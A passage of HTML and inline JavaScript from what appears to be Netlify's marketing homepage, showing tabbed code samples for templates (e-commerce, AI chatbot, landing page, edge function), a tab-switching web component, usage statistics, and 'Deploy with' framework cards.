                                                                    <span style="color:#F6F6F4">appConfig.apiConfig,</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">user</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#F6F6F4">context.ip,</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">messages</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#F6F6F4">[{ role</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#E7EE98">system</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#F6F6F4">, content</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#F6F6F4">prompt }, </span>
                                                                    <span style="color:#F286C4">...</span>
                                                                    <span style="color:#F6F6F4">messages],</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">},</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">appConfig.</span>
                                                                    <span style="color:#BF9EEE">OPENAI_API_KEY</span>
                                                                    <span style="color:#F286C4">??</span>
                                                                    <span style="color:#DEE492">""</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">);</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">return</span>
                                                                    <span style="color:#F286C4;font-weight:bold">new</span>
                                                                    <span style="color:#62E884">Response</span>
                                                                    <span style="color:#F6F6F4">(stream, {</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">headers</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#F6F6F4">{ </span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#E7EE98">Content-Type</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#E7EE98">text/plain</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#F6F6F4">},</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">});</span>
                                                                </span>
                                                            </code>
                                                        </pre>
                                                    </div>
                                                </div>
                                                <div data-sb-field-path="templates.2.code" role="tabpanel" hidden="" data-astro-cid-bthvj2cz="" id="mfnw1s84-panel-2" aria-labelledby="cta-dev-code-tabs-landing-page">
                                                    <div data-astro-cid-bthvj2cz="true" class="astro-jgrc2lfe">
                                                        <pre class="astro-code dracula-soft" style="background-color:#282A36;color:#f6f6f4; overflow-x: auto;" tabindex="0" data-language="js">                                                            <code>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">---</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">const</span>
                                                                    <span style="color:#F6F6F4">homepage </span>
                                                                    <span style="color:#F286C4">=</span>
                                                                    <span style="color:#F286C4">await</span>
                                                                    <span style="color:#62E884">getEntryBySlug</span>
                                                                    <span style="color:#F6F6F4">(</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#E7EE98">homepage</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#F6F6F4">, </span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#E7EE98">index</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#F6F6F4">);</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">const</span>
                                                                    <span style="color:#F6F6F4">{ banner, key_features, service, testimonial } </span>
                                                                    <span style="color:#F286C4">=</span>
                                                                    <span style="color:#F6F6F4">homepage.data;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">---</span>
                                                                </span>
                                                                <span class="line"></span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;</span>
                                                                    <span style="color:#97E1F1;font-style:italic">Base</span>
                                                                    <span style="color:#F6F6F4">&gt;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;</span>
                                                                    <span style="color:#97E1F1;font-style:italic">Banner</span>
                                                                    <span style="color:#62E884;font-style:italic">banner</span>
                                                                    <span style="color:#F286C4">={</span>
                                                                    <span style="color:#F6F6F4">banner</span>
                                                                    <span style="color:#F286C4">}</span>
                                                                    <span style="color:#F6F6F4">/&gt;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;</span>
                                                                    <span style="color:#97E1F1;font-style:italic">KeyFeatures</span>
                                                                    <span style="color:#62E884;font-style:italic">key_features</span>
                                                                    <span style="color:#F286C4">={</span>
                                                                    <span style="color:#F6F6F4">key_features</span>
                                                                    <span style="color:#F286C4">}</span>
                                                                    <span style="color:#F6F6F4">/&gt;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;</span>
                                                                    <span style="color:#97E1F1;font-style:italic">Service</span>
                                                                    <span style="color:#62E884;font-style:italic">service</span>
                                                                    <span style="color:#F286C4">={</span>
                                                                    <span style="color:#F6F6F4">service</span>
                                                                    <span style="color:#F286C4">}</span>
                                                                    <span style="color:#F6F6F4">/&gt;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;</span>
                                                                    <span style="color:#97E1F1;font-style:italic">Testimonial</span>
                                                                    <span style="color:#62E884;font-style:italic">testimonial</span>
                                                                    <span style="color:#F286C4">={</span>
                                                                    <span style="color:#F6F6F4">testimonial</span>
                                                                    <span style="color:#F286C4">}</span>
                                                                    <span style="color:#F6F6F4">/&gt;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;</span>
                                                                    <span style="color:#97E1F1;font-style:italic">Cta</span>
                                                                    <span style="color:#F6F6F4">/&gt;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;/</span>
                                                                    <span style="color:#97E1F1;font-style:italic">Base</span>
                                                                    <span style="color:#F6F6F4">&gt;</span>
                                                                </span>
                                                            </code>
                                                        </pre>
                                                    </div>
                                                </div>
                                                <div data-sb-field-path="templates.3.code" role="tabpanel" hidden="" data-astro-cid-bthvj2cz="" id="mfnw1s84-panel-3" aria-labelledby="cta-dev-code-tabs-edge-function">
                                                    <div data-astro-cid-bthvj2cz="true" class="astro-jgrc2lfe">
                                                        <pre class="astro-code dracula-soft" style="background-color:#282A36;color:#f6f6f4; overflow-x: auto;" tabindex="0" data-language="js">                                                            <code>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">import</span>
                                                                    <span style="color:#F286C4">type</span>
                                                                    <span style="color:#F6F6F4">{ Config, Context } </span>
                                                                    <span style="color:#F286C4">from</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#E7EE98">@netlify/edge-functions</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#F6F6F4">;</span>
                                                                </span>
                                                                <span class="line"></span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">export</span>
                                                                    <span style="color:#F286C4">default</span>
                                                                    <span style="color:#F286C4">async</span>
                                                                    <span style="color:#F6F6F4">(</span>
                                                                    <span style="color:#FFB86C;font-style:italic">request</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#97E1F1;font-style:italic">Request</span>
                                                                    <span style="color:#F6F6F4">, </span>
                                                                    <span style="color:#FFB86C;font-style:italic">context</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#97E1F1;font-style:italic">Context</span>
                                                                    <span style="color:#F6F6F4">) </span>
                                                                    <span style="color:#F286C4">=&gt;</span>
                                                                    <span style="color:#F6F6F4">{</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">return</span>
                                                                    <span style="color:#F6F6F4">Response.</span>
                                                                    <span style="color:#62E884">json</span>
                                                                    <span style="color:#F6F6F4">({ geo</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#F6F6F4">context.geo });</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">};</span>
                                                                </span>
                                                                <span class="line"></span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">export</span>
                                                                    <span style="color:#F286C4">const</span>
                                                                    <span style="color:#F6F6F4">config</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#97E1F1;font-style:italic">Config</span>
                                                                    <span style="color:#F286C4">=</span>
                                                                    <span style="color:#F6F6F4">{</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">path</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#E7EE98">/geolocation</span>
                                                                    <span style="color:#DEE492">"</span>
                                                                    <span style="color:#F6F6F4">,</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">};</span>
                                                                </span>
                                                            </code>
                                                        </pre>
                                                    </div>
                                                </div>
                                            </div>
                                        </the-tabs>
                                        <script type="module">
                                            class r extends HTMLElement {
                                                get tabs() {
                                                    return [...this.querySelectorAll("[role=tab]")]
                                                }
                                                get panels() {
                                                    return [...this.querySelectorAll("[role=tabpanel]")]
                                                }
                                                get selected() {
                                                    return this.querySelector("[role=tab][aria-selected=true]")
                                                }
                                                set selected(e) {
                                                    this.selected?.setAttribute("aria-selected", "false"),
                                                    e?.setAttribute("aria-selected", "true"),
                                                    this.updateSelection()
                                                }
                                                connectedCallback() {
                                                    this.generateIds(),
                                                    this.updateSelection(),
                                                    this.setupEvents()
                                                }
                                                generateIds() {
                                                    const e = Math.floor(Date.now()).toString(36);
                                                    this.tabs.forEach( (t, s) => {
                                                        const i = this.panels[s];
                                                        t.id ||= `${e}-tab-${s}`,
                                                        i.id ||= `${e}-panel-${s}`,
                                                        t.setAttribute("aria-controls", i.id),
                                                        i.setAttribute("aria-labelledby", t.id)
                                                    }
                                                    )
                                                }
                                                updateSelection() {
                                                    const e = new Event("tab-change");
                                                    this.tabs.forEach( (t, s) => {
                                                        const i = this.panels[s]
                                                          , l = t.getAttribute("aria-selected") === "true";
                                                        t.setAttribute("aria-selected", l ? "true" : "false"),
                                                        t.setAttribute("tabindex", l ? "0" : "-1"),
                                                        i.hidden = !l
                                                    }
                                                    ),
                                                    this.selected.dispatchEvent(e)
                                                }
                                                setupEvents() {
                                                    this.tabs.forEach(e => {
                                                        e.addEventListener("click", () => {
                                                            this.selected !== e && (this.selected = e,
                                                            this.selected.focus())
                                                        }
                                                        ),
                                                        e.addEventListener("keydown", t => {
                                                            t.key === "ArrowLeft" ? this.selected = e.previousElementSibling ?? this.tabs.at(-1) : t.key === "ArrowRight" && (this.selected = e.nextElementSibling ?? this.tabs.at(0)),
                                                            ["ArrowLeft", "ArrowRight"].includes(t.key) && this.selected.focus()
                                                        }
                                                        )
                                                    }
                                                    )
                                                }
                                            }
                                            customElements.define("the-tabs", r);
                                        </script>
                                        <footer class="l-cluster" data-astro-cid-bthvj2cz="">
                                            <a target="_blank" rel="noopener noreferrer" data-sb-field-path=".deployCta" class="dev-pancake-deploy-btn | button" data-type="primary" href="https://app.netlify.com/start/deploy?repository=https://github.com/netlify/hydrogen-template&amp;__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795#SESSION_SECRET=mock%20token&amp;PUBLIC_STORE_DOMAIN=mock.shop" id="cta-dev-pancake-deploy-to-netlify" data-astro-cid-bthvj2cz="">Deploy to Netlify </a>
                                        </footer>
                                    </section>
                                </article>
                                <article class="dev-pancake-proofs" data-theme="dark" data-astro-cid-bthvj2cz="">
                                    <ul role="list" data-astro-cid-bthvj2cz="">
                                        <li data-sb-field-path=".stats.0" data-astro-cid-bthvj2cz="">
                                            <h3 class="text-2" data-astro-cid-bthvj2cz="">35M+</h3>
                                            <p data-astro-cid-bthvj2cz="">Projects deployed on Netlify</p>
                                        </li>
                                        <li data-sb-field-path=".stats.1" data-astro-cid-bthvj2cz="">
                                            <h3 class="text-2" data-astro-cid-bthvj2cz="">8M+</h3>
                                            <p data-astro-cid-bthvj2cz="">Developers</p>
                                        </li>
                                        <li data-sb-field-path=".stats.2" data-astro-cid-bthvj2cz="">
                                            <h3 class="text-2" data-astro-cid-bthvj2cz="">99.99%</h3>
                                            <p data-astro-cid-bthvj2cz="">Uptime SLA</p>
                                        </li>
                                    </ul>
                                </article>
                            </div>
                            <script>
                                (function() {
                                    const templates = [{
                                        "title": "e-commerce site",
                                        "icon": "store",
                                        "url": "https://app.netlify.com/start/deploy?repository=https://github.com/netlify/hydrogen-template#SESSION_SECRET=mock%20token&PUBLIC_STORE_DOMAIN=mock.shop",
                                        "code": {
                                            "lang": "js",
                                            "block": "export function CartMain({layout, cart}: CartMainProps) {\n  const linesCount = Boolean(cart?.lines?.nodes?.length || 0);\n  const withDiscount =\n    cart &&\n    Boolean(cart.discountCodes.filter((code) => code.applicable).length);\n  const className = `cart-main ${withDiscount ? 'with-discount' : ''}`;\n\n  return (\n    <div className={className}>\n      <CartEmpty hidden={linesCount} layout={layout} />\n      <CartDetails cart={cart} layout={layout} />\n    </div>\n  );\n}"
                                        }
                                    }, {
                                        "title": "AI chatbot",
                                        "icon": "sparkles",
                                        "url": "https://app.netlify.com/start/deploy?repository=https://github.com/ascorbic/daneel",
                                        "code": {
                                            "lang": "js",
                                            "block": "const stream = await getChatStream(\n  {\n    ...appConfig.apiConfig,\n    user: context.ip,\n    messages: [{ role: \"system\", content: prompt }, ...messages],\n  },\n  appConfig.OPENAI_API_KEY ?? \"\"\n);\nreturn new Response(stream, {\n  headers: { \"Content-Type\": \"text/plain\" },\n});"
                                        }
                                    }, {
                                        "title": "landing page",
                                        "icon": "browser",
                                        "url": "https://app.netlify.com/start/deploy?repository=https://github.com/themefisher/pinwheel-astro",
                                        "code": {
                                            "lang": "js",
                                            "block": "---\nconst homepage = await getEntryBySlug(\"homepage\", \"index\");\nconst { banner, key_features, service, testimonial } = homepage.data;\n---\n\n<Base>\n  <Banner banner={banner} />\n  <KeyFeatures key_features={key_features} />\n  <Service service={service} />\n  <Testimonial testimonial={testimonial} />\n  <Cta />\n</Base>"
                                        }
                                    }, {
                                        "title": "edge function",
                                        "icon": "lambda",
                                        "url": "https://app.netlify.com/start/deploy?repository=https://github.com/netlify/edge-functions-examples&utm_campaign=devex&utm_source=edge-functions-examples&utm_medium=web&utm_content=Deploy%20Edge%20Functions%20Examples%20to%20Netlify",
                                        "code": {
                                            "lang": "js",
                                            "block": "import type { Config, Context } from \"@netlify/edge-functions\";\n\nexport default async (request: Request, context: Context) => {\n  return Response.json({ geo: context.geo });\n};\n\nexport const config: Config = {\n  path: \"/geolocation\",\n};"
                                        }
                                    }];

                                    const devPancake = document.getElementById('dev-pancake');
                                    const dynamicText = devPancake.querySelector('.dev-pancake-dynamic-text');
                                    const deployBtn = devPancake.querySelector('.dev-pancake-deploy-btn');
                                    const tabsComponent = devPancake.querySelector('the-tabs');
                                    const tabs = devPancake.querySelectorAll('[role="tab"]');
                                    const tabIcons = devPancake.querySelectorAll('[role="tab"] .icon');
                                    const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

                                    let fps = 20;
                                    let interval = Math.floor(1000 / fps);
                                    let startTime = performance.now();
                                    let prevTime = startTime;
                                    let deltaTime = 0;
                                    let currentTime = 0;
                                    let currentIndex = -1;
                                    let animateTextRAF;
                                    let cycleTextTimeout;

                                    startCycleText();

                                    tabs.forEach( (tab, index) => {
                                        tab.addEventListener('tab-change', () => {
                                            const {title, url} = templates[index];

                                            if (index === currentIndex)
                                                return;

                                            animateText(title, dynamicText);
                                            deployBtn.setAttribute('href', url);
                                            currentIndex = index;
                                        }
                                        );
                                    }
                                    );

                                    function setIconGlow() {
                                        tabIcons.forEach( (icon, index) => {
                                            icon.classList.toggle('is-active', index === currentIndex);
                                        }
                                        );
                                    }

                                    function removeIconGlow() {
                                        tabIcons.forEach( (icon) => icon.classList.remove('is-active'));
                                    }

                                    function startCycleText() {
                                        if (currentIndex === templates.length - 1) {
                                            currentIndex = 0;
                                        } else {
                                            currentIndex++;
                                        }

                                        let text = templates[currentIndex].title;
                                        animateText(text, dynamicText);
                                        setIconGlow();
                                        cycleTextTimeout = setTimeout(startCycleText, 2000);
                                    }

                                    function stopCycleText() {
                                        removeIconGlow();
                                        clearTimeout(cycleTextTimeout);
                                        cycleTextTimeout = null;
                                    }

                                    function animateText(text, container) {
                                        if (reduceMotion) {
                                            container.innerHTML = text;
                                            return;
                                        }

                                        let i = -1;

                                        function animate(timestamp) {
                                            if (i < text.length) {
                                                currentTime = timestamp;
                                                deltaTime = currentTime - prevTime;

                                                if (deltaTime > interval) {
                                                    prevTime = currentTime - (deltaTime % interval);
                                                    container.innerHTML += text.charAt(i);
                                                    i++;
                                                }

                                                animateTextRAF = requestAnimationFrame(animate);
                                            }
                                        }

                                        cancelAnimationFrame(animateTextRAF);
                                        container.innerHTML = '';
                                        animate();
                                    }

                                    const handleTabsFocus = () => {
                                        if (cycleTextTimeout) {
                                            stopCycleText();
                                            tabsComponent?.removeEventListener('focus', handleTabsFocus, true);
                                        }
                                    }
                                    ;

                                    tabsComponent?.addEventListener('focus', handleTabsFocus, true);
                                }
                                )();
                            </script>
                        </div>
                    </div>
                </section>
                <section class="pancake | l-section pancake-margin-top-override" data-sb-field-path="GZpQT76vrL14dXDLi338hK:pancakes.4" data-theme="light-gradient" data-astro-cid-5mutinvq="" style="--breakout-area: content;--margin-block-start: var(--space-0);">
                    <picture class="pancake-graphics" data-options="" data-astro-cid-5mutinvq="true" data-astro-cid-dxfgtee3="" style="--graphic-object-fit: cover;"></picture>
                    <div class="pancake-content | l-stack l-stack-xl" data-astro-cid-5mutinvq="" style="--breakout-area: content;--margin-block-start: var(--space-0);">
                        <div class="ingredient l-breakout ingredient-section-header" data-astro-cid-gfez5emt="" style="">
                            <div class="b-heading text-center" data-sb-field-path=".ingredients.0" _key="db3fe984-3205-4105-b65f-9bccb03a6f13" _type="sectionHeader" data-astro-cid-wk2votdk="" style="--heading-space: var(--space-s);--subheading-space: var(--space-l);--supporting-space: var(--space-s);">
                                <p class="preheading a-fade-in" data-variant="" data-sb-field-path=".preheading" data-astro-cid-wk2votdk="" style="--heading-space: var(--space-s);--subheading-space: var(--space-l);--supporting-space: var(--space-s);">Get started </p>
                                <h3 class="heading" data-sb-field-path=".heading" data-astro-cid-wk2votdk="true">Deploy any web project in minutes</h3>
                            </div>
                        </div>
                        <div class="ingredient l-breakout ingredient-columns" data-astro-cid-gfez5emt="" style="">
                            <div class="l-grid ingredient-columns" data-sb-field-path=".ingredients.1" style="--grid-gap:var(--space-m);--grid-min:240px;--grid-align:flex-start" data-astro-cid-fsqfrxl4="">
                                <div data-sb-field-path=".columns.0" class="column l-stack l-stack-medium" style="" data-astro-cid-fsqfrxl4="">
                                    <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                        <div class="card | l-flex-stack l-stack-medium" data-options="full-width-media" data-sb-field-path=".items.0" data-theme="light" data-astro-cid-dohjnao5="">
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <img src="/_astro/e527c1024f95da19776452728a800b222047f907-500x300_2lkAx5.webp" alt="" data-sb-object-id="image-e527c1024f95da19776452728a800b222047f907-500x300-png" data-astro-cid-jbhojhg7="true" loading="lazy" decoding="async" fetchpriority="auto" width="500" height="300">
                                            </div>
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <h3 data-sb-field-path=".items.1" data-astro-cid-u4qoyrkz="true" class="heading l-stack l-stack-3xs font-heading text-2 font-bold text-left">
                                                    <a href="https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/astro-platform-starter?utm_campaign=template-team&amp;utm_source=dtn-button&amp;utm_medium=dtn-button&amp;utm_term=astro-tt-dtn-button&amp;utm_content=astro-tt-dtn-button&amp;__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" id="cta-deployTemplate-astro" class="astro-u4qoyrkz" data-astro-cid-u4qoyrkz="" style="">
                                                        <span class="heading-eyebrow text--2 font-medium" data-mode="light" data-type="light" data-size="small" data-astro-cid-u4qoyrkz="true">Deploy with </span>
                                                        <span data-astro-cid-u4qoyrkz="" style="">Astro</span>
                                                    </a>
                                                </h3>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div data-sb-field-path=".columns.1" class="column l-stack l-stack-medium" style="" data-astro-cid-fsqfrxl4="">
                                    <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                        <div class="card | l-flex-stack l-stack-medium" data-options="full-width-media" data-sb-field-path=".items.0" data-theme="light" data-astro-cid-dohjnao5="">
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <img src="/_astro/fc74fe0f3c7b251aafb1fb9fa48a17474017007a-480x289_1RLJ1b.webp" alt="" data-sb-object-id="image-fc74fe0f3c7b251aafb1fb9fa48a17474017007a-480x289-png" data-astro-cid-jbhojhg7="true" loading="lazy" decoding="async" fetchpriority="auto" width="480" height="289">
                                            </div>
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <h3 data-sb-field-path=".items.1" data-astro-cid-u4qoyrkz="true" class="heading l-stack l-stack-3xs font-heading text-2 font-bold text-left">
                                                    <a href="https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/tanstack-template&amp;__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" id="cta-deployTemplate-tanstack" class="astro-u4qoyrkz" data-astro-cid-u4qoyrkz="" style="">
                                                        <span class="heading-eyebrow text--2 font-medium" data-mode="light" data-type="light" data-size="small" data-astro-cid-u4qoyrkz="true">Deploy with </span>
                                                        <span data-astro-cid-u4qoyrkz="" style="">TanStack</span>
                                                    </a>
                                                </h3>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div data-sb-field-path=".columns.2" class="column l-stack l-stack-medium" style="" data-astro-cid-fsqfrxl4="">
                                    <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                        <div class="card | l-flex-stack l-stack-medium" data-options="full-width-media" data-sb-field-path=".items.0" data-theme="light" data-astro-cid-dohjnao5="">
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <img src="/_astro/1df2a2802fd52367caf64f40b8c091137ded9938-500x300_ZUyOiC.webp" alt="" data-sb-object-id="image-1df2a2802fd52367caf64f40b8c091137ded9938-500x300-png" data-astro-cid-jbhojhg7="true" loading="lazy" decoding="async" fetchpriority="auto" width="500" height="300">
                                            </div>
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <h3 data-sb-field-path=".items.1" data-astro-cid-u4qoyrkz="true" class="heading l-stack l-stack-3xs font-heading text-2 font-bold text-left">
                                                    <a href="https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/next-platform-starter&amp;__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" id="cta-deployTemplate-nextjs" class="astro-u4qoyrkz" data-astro-cid-u4qoyrkz="" style="">
                                                        <span class="heading-eyebrow text--2 font-medium" data-mode="light" data-type="light" data-size="small" data-astro-cid-u4qoyrkz="true">Deploy with </span>
                                                        <span data-astro-cid-u4qoyrkz="" style="">Next.JS</span>
                                                    </a>
                                                </h3>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div data-sb-field-path=".columns.3" class="column l-stack l-stack-medium" style="" data-astro-cid-fsqfrxl4="">
                                    <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                        <div class="card | l-flex-stack l-stack-medium" data-options="full-width-media" data-sb-field-path=".items.0" data-theme="light" data-astro-cid-dohjnao5="">
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <img src="/_astro/e2ef0653df7a417d7c781e01a14d81099de29478-500x300_21iEk.webp" alt="" data-sb-object-id="image-e2ef0653df7a417d7c781e01a14d81099de29478-500x300-png" data-astro-cid-jbhojhg7="true" loading="lazy" decoding="async" fetchpriority="auto" width="500" height="300">
                                            </div>
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <h3 data-sb-field-path=".items.1" data-astro-cid-u4qoyrkz="true" class="heading l-stack l-stack-3xs font-heading text-2 font-bold text-left">
                                                    <a href="https://app.netlify.com/start/deploy?repository=https://github.com/netlify/hydrogen-template&amp;__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795#SESSION_SECRET=mock%20token&amp;PUBLIC_STORE_DOMAIN=mock.shop" id="cta-deployTemplate-remix" class="astro-u4qoyrkz" data-astro-cid-u4qoyrkz="" style="">
                                                        <span class="heading-eyebrow text--2 font-medium" data-mode="light" data-type="light" data-size="small" data-astro-cid-u4qoyrkz="true">Deploy with </span>
                                                        <span data-astro-cid-u4qoyrkz="" style="">Remix</span>
                                                    </a>
                                                </h3>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="ingredient l-breakout ingredient-logo-squares" data-astro-cid-gfez5emt="" style="">
                            <section class="logo-squares" data-sb-field-path=".ingredients.2" data-astro-cid-cgxpeooz="">
                                <div class="l-center l-stack l-stack-large" data-astro-cid-cgxpeooz="">
                                    <ul class="has-sdk" data-sb-field-path=".items" data-astro-cid-cgxpeooz="">
                                        <li data-sb-field-path=".0" data-astro-cid-cgxpeooz="">
                                            <div class="integration-icon | l-center-xy" data-astro-cid-cgxpeooz="">
                                                <img data-sb-field-path=".logo" src="https://cdn.sanity.io/images/o0o2tn5x/marketing/422f266703336272326e4905c466e56e8a018f54-30x30.svg?auto=format" data-astro-cid-cgxpeooz="">
                                            </div>
                                        </li>
                                        <li data-sb-field-path=".1" data-astro-cid-cgxpeooz="">
                                            <div class="integration-icon | l-center-xy" data-astro-cid-cgxpeooz="">
                                                <img data-sb-field-path=".logo" src="https://cdn.sanity.io/images/o0o2tn5x/marketing/fceb2bde194e2f8db2a8f3db843f25995b9cb8d1-92x82.svg?auto=format" data-astro-cid-cgxpeooz="">
                                            </div>
                                        </li>
                                        <li data-sb-field-path=".2" data-astro-cid-cgxpeooz="">
                                            <div class="integration-icon | l-center-xy" data-astro-cid-cgxpeooz="">
                                                <img data-sb-field-path=".logo" src="https://cdn.sanity.io/images/o0o2tn5x/marketing/d5f415b594d613661ab2f52fb01299826c1d8527-1200x1183.png?auto=format" data-astro-cid-cgxpeooz="">
                                            </div>
                                        </li>
                                        <li data-sb-field-path=".3" data-astro-cid-cgxpeooz="">
                                            <div class="integration-icon | l-center-xy" data-astro-cid-cgxpeooz="">
                                                <img data-sb-field-path=".logo" src="https://cdn.sanity.io/images/o0o2tn5x/marketing/4af7ddd4f7c5aafc5c6afee167cee78d4477262b-262x227.svg?auto=format" data-astro-cid-cgxpeooz="">
                                            </div>
                                        </li>
                                        <li data-sb-field-path=".4" data-astro-cid-cgxpeooz="">
                                            <div class="integration-icon | l-center-xy" data-astro-cid-cgxpeooz="">
                                                <img data-sb-field-path=".logo" src="https://cdn.sanity.io/images/o0o2tn5x/marketing/edc6ad80f0d27191b15406e8e66eadbd51a78ad6-28x28.svg?auto=format" data-astro-cid-cgxpeooz="">
                                            </div>
                                        </li>
                                        <li data-sb-field-path=".5" data-astro-cid-cgxpeooz="">
                                            <div class="integration-icon | l-center-xy" data-astro-cid-cgxpeooz="">
                                                <img data-sb-field-path=".logo" src="https://cdn.sanity.io/images/o0o2tn5x/marketing/9c6b703ef2f230568115526a043a5463c7c34735-36x36.svg?auto=format" data-astro-cid-cgxpeooz="">
                                            </div>
                                        </li>
                                        <li data-sb-field-path=".6" data-astro-cid-cgxpeooz="">
                                            <div class="integration-icon | l-center-xy" data-astro-cid-cgxpeooz="">
                                                <img data-sb-field-path=".logo" src="https://cdn.sanity.io/images/o0o2tn5x/marketing/b9a4e394bb16f7dac59bb7134c889625fe95a49a-36x36.svg?auto=format" data-astro-cid-cgxpeooz="">
                                            </div>
                                        </li>
                                        <li data-sb-field-path=".7" data-astro-cid-cgxpeooz="">
                                            <div class="integration-icon | l-center-xy" data-astro-cid-cgxpeooz="">
                                                <img data-sb-field-path=".logo" src="https://cdn.sanity.io/images/o0o2tn5x/marketing/92aca18c7e56899f66021e2d9f3df1082e3dac3b-75x83.svg?auto=format" data-astro-cid-cgxpeooz="">
                                            </div>
                                        </li>
                                        <li class="sdk | text--1" data-sb-field-path=".8" data-theme="light" data-astro-cid-cgxpeooz="">
                                            <span class="leading-tight" data-sb-field-path=".text" data-astro-cid-cgxpeooz="">Head over to our docs for a full list of framework configurations. </span>
                                            <a data-type="text" data-icon-position="inline-end" data-inline-icon="true" data-icon-only="false" data-icon-name="arrow" data-sb-field-path=".cta" href="https://docs.netlify.com/frameworks/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-astro-cid-cgxpeooz="true" data-astro-cid-tcbm7f7q="true" class="button cta-arrow-link">
                                                <span data-astro-cid-tcbm7f7q="true">Go to Netlify docs</span>
                                                <span class="icon-wrapper" data-astro-cid-tcbm7f7q="true">
                                                    <svg width="0.88em" height="1em" aria-hidden="true" data-astro-cid-tcbm7f7q="true" data-astro-cid-patnjmll="true" class="icon" data-icon="arrow">
